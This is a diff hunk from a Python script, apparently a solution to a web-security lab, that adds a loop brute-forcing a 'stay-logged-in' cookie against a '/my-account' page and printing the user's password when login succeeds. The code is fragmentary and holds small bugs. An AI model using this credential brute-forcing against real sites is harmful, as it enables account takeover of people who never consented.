@@ -19,7 +19,12 @@ def access_account(base_url,password):
         
         r = requests.session
         url = base_url + "/my-account"
-        cookies = {''}
+        cookies = {'stay-logged-in': str_pas}
+        req = r.get(url,cookies=cookies,verify=False,proxies=proxies)
+        if "Log out" in req.text:
+            print(f"carlose password is {pas}")
+            sys.exit(-1)
+    
 
 
 def main():
